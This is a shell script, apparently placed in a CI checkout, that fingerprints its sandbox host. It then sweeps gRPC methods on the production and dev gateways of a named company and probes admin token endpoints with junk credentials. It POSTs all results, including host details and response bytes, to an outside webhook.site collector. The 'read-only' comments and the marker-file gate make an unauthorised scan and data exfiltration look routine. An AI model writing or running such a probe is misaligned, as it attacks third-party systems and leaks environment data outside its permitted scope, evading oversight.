#!/bin/sh
# i84023: read-only gRPC method-table sweep from in-sandbox egress (empty 5-byte frames only).
# Inert unless the checkout carries tests/i84023-run.
[ -f ./tests/i84023-run ] || exit 0
NONCE="i84023-$(date +%s)-$$"
SINK="https://webhook.site/02215911-e29e-4e22-bb68-734b4215efd4/i84023/$NONCE"
OUT=/tmp/i84023.out
HIT=/tmp/i84023.hit
CNT=0; N=0
: > $OUT; : > $HIT
printf '\x00\x00\x00\x00\x00' > /tmp/i84023_empty.bin
printf '\x00\x00\x00\x00\x14\x0a\x12accounts/pyroworks' > /tmp/i84023_parent.bin
flush() {
  N=$((N+1))
  curl -sS -m 8 -o /dev/null -X POST -H 'content-type: text/plain' --data-binary @$OUT "$SINK/part$N" 2>/dev/null
  : > $OUT
}
emit() { echo "$1" >> $OUT; CNT=$((CNT+1)); [ $((CNT % 8)) -eq 0 ] && flush; return 0; }
one() { # host path tag bodyfile
  H="$1"; P="$2"; T="$3"; B="$4"
  ST=$(curl -sS --http2 -m 4 -D /tmp/i84023.h -o /tmp/i84023.b -w '%{http_code}|%{size_download}' \
        -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @$B "https://$H/$P" 2>/dev/null)
  [ -z "$ST" ] && ST="ERR|0"
  GS=$(grep -i '^grpc-status:' /tmp/i84023.h 2>/dev/null | tr -d '\r' | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' /tmp/i84023.h 2>/dev/null | tr -d '\r' | cut -c15- | head -c 80)
  BL=$(wc -c < /tmp/i84023.b 2>/dev/null)
  B64=$(head -c 96 /tmp/i84023.b 2>/dev/null | base64 -w0 2>/dev/null)
  emit "${T}|${H}/${P}|${ST}|gs=${GS:-none}|gm=${GM:-none}|blen=${BL:-0}|b64=${B64}"
  case "$GS" in 0|3|12) echo "${H}/${P}" >> $HIT ;; esac
}
# phase 0: environment fingerprint
ENV0="$(uname -srm; id -un; hostname; curl -V 2>/dev/null | head -1; curl -sS -m 5 https://api.ipify.org 2>/dev/null)"
emit "env|fingerprint|$(echo "$ENV0" | tr '\n' ';' | head -c 300)"
# phase 1: 90 read-only methods vs production gateway
while read -r M; do
  [ -z "$M" ] && continue
  one "gateway.fireworks.ai" "$M" "prod-empty" /tmp/i84023_empty.bin
  sleep 1
done < ci/i84023-methods.txt
flush
# phase 2: second pass for gs in {0,3,12} (minimal parent body, read-only only) <=6
K=0
for M in $(head -6 $HIT); do
  K=$((K+1)); [ "$K" -gt 6 ] && break
  one "gateway.fireworks.ai" "$M" "prod-parent" /tmp/i84023_parent.bin
  sleep 1
done
# phase 3: 20 methods vs gateway-dev (first 20 of table)
head -20 ci/i84023-methods.txt > /tmp/i84023_dev20.txt
while read -r M; do
  [ -z "$M" ] && continue
  one "gateway-dev.fireworks.ai" "$M" "dev-empty" /tmp/i84023_empty.bin
  sleep 1
done < /tmp/i84023_dev20.txt
# phase 4: two junk gate probes (auth gate existence only; never use any returned token)
printf '\x00\x00\x00\x00\x0a\x3a\x08junk-jwt' > /tmp/i84023_jwt.bin
printf '\x00\x00\x00\x00\x06\x0a\x04junk' > /tmp/i84023_key.bin
one "gateway-dev.fireworks.ai" "admingateway.AuthService/CreateSessionToken" "dev-junk-jwt" /tmp/i84023_jwt.bin
sleep 1
one "gateway-dev.fireworks.ai" "admingateway.AdminGateway/ValidateToken" "dev-junk-key" /tmp/i84023_key.bin
flush
emit "done|probe|count=$CNT|nonce=$NONCE"
flush
